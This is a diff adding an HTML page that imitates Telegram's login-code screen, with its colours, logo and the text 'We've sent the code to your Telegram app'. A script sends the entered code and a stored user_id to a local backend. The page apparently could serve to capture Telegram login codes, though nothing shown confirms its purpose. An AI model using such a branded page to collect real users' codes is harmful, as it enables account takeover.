@@ -1,0 +1,124 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verify Code - Telegram</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
+            background-color: #17212b;
+            color: white;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+        .container {
+            width: 100%;
+            max-width: 400px;
+            padding: 20px;
+            text-align: center;
+        }
+        .logo {
+            width: 80px;
+            height: 80px;
+            background-color: #3390ec;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 20px;
+        }
+        h1 {
+            margin-bottom: 10px;
+            font-size: 24px;
+        }
+        p {
+            color: #8e8e8e;
+            margin-bottom: 30px;
+        }
+        .form-group {
+            margin-bottom: 20px;
+            text-align: left;
+        }
+        label {
+            display: block;
+            margin-bottom: 8px;
+            color: #8e8e8e;
+        }
+        input {
+            width: 100%;
+            padding: 12px;
+            border: none;
+            background-color: #242f3d;
+            color: white;
+            border-radius: 8px;
+            margin-bottom: 15px;
+            font-size: 16px;
+            text-align: center;
+            letter-spacing: 4px;
+        }
+        button {
+            width: 100%;
+            padding: 12px;
+            background-color: #3390ec;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <svg width="28" height="28" viewBox="0 0 28 28" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <path d="M23.0846 5.92622L4.25034 12.3519C3.1669 12.7309 3.17382 13.3054 4.05034 13.5359L9.25034 15.1729L19.9149 8.88622C20.3926 8.58622 20.8286 8.74747 20.4686 9.07622L11.7303 16.9359H11.7286L11.7303 16.9367L11.3563 22.3002C11.7926 22.3002 11.9846 22.0984 12.2286 21.8634L14.7686 19.3902L20.0286 23.2327C20.8114 23.6659 21.3786 23.4424 21.5726 22.5019L24.9303 7.17122C25.2149 6.02622 24.4883 5.50497 23.0846 5.92622Z" fill="white"/>
+            </svg>
+        </div>
+        <h1>Enter Code</h1>
+        <p>We've sent the code to your Telegram app.</p>
+        <div class="form-group">
+            <input type="text" id="code" maxlength="5" placeholder="●●●●●">
+        </div>
+        <button onclick="handleVerify()">NEXT</button>
+    </div>
+    <script>
+        function handleVerify() {
+            const code = document.getElementById('code').value;
+            const userId = localStorage.getItem('user_id');
+            
+            fetch('http://localhost:4000/verify_code', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    code: code,
+                    user_id: userId
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.status === 200) {
+                    window.location.href = '/success.html';
+                }
+            })
+            .catch(error => console.error('Error:', error));
+        }
+
+        // Format code input
+        document.getElementById('code').addEventListener('input', function(e) {
+            let code = e.target.value.replace(/\D/g, '');
+            if (code.length > 5) {
+                code = code.slice(0, 5);
+            }
+            e.target.value = code;
+        });
+    </script>
+</body>
+</html> 
